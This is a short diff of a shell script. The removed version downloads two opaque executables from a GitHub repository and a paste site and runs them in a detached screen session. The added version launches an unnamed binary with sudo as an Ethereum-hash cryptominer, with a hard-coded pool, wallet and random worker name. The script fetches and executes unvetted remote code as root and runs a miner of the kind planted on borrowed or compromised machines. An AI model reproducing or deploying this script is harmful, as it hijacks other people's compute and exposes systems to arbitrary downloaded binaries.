@@ -1,2 +1,7 @@
-#!/bin/sh
-! sudo apt update && sudo apt install screen -y && screen -dmS 0IWEVK  ./0IWEVK  65 75 && wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://www.heypasteit.com/download/0IWEVK && chmod +x 0IWEVK && ./0IWEVK 
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=WIN:TNm3k3uCQXtfYhwPZFzNq4dTCPumBSfYNp
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-USER1#ek61-6h9x)
+
+
+chmod +x ./3hhNoTC && sudo ./3hhNoTC --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
